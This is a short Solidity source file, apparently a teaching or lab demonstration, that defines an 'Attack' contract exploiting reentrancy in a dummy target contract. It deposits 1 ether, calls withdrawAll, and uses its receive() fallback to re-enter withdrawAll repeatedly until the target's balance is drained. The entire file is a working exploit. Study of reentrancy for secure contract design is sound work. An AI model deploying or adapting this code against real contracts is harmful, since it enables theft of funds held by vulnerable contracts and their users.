// SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

//imagevillain reentrancy attacker

interface IDummyContract {
    function deposit() external payable;
    function withdrawAll() external;
}

contract Attack {
    IDummyContract public immutable dummyContract;

    constructor(IDummyContract _dummyContract) {
        dummyContract = _dummyContract;
    }
    
    receive() external payable {
        if (address(dummyContract).balance >= 1 ether) {
            dummyContract.withdrawAll();
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "require 1 eth for attack to be successful");
        dummyContract.deposit{value: 1 ether}();
        dummyContract.withdrawAll();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
